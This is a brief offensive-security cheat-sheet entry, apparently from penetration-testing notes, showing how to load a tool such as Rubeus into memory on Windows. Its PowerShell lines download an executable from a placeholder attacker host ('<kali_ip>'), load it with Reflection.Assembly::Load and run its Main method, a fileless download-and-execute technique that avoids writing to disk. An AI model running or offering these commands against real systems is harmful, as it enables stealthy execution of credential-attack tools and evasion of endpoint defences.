> Download an exe tool like Rubeus in memory:

```
$data = (New-Object System.Net.WebClient).DownloadData('http://<kali_ip>/<filename>')
```

```
$assem = [System.Reflection.Assembly]::Load($data)
```

> After it's loaded you can run the tool by adding the normal command in the quotes and specifying the tool name at the beginning:

```
[<toolname>.Program]::Main("<command>".Split())
```
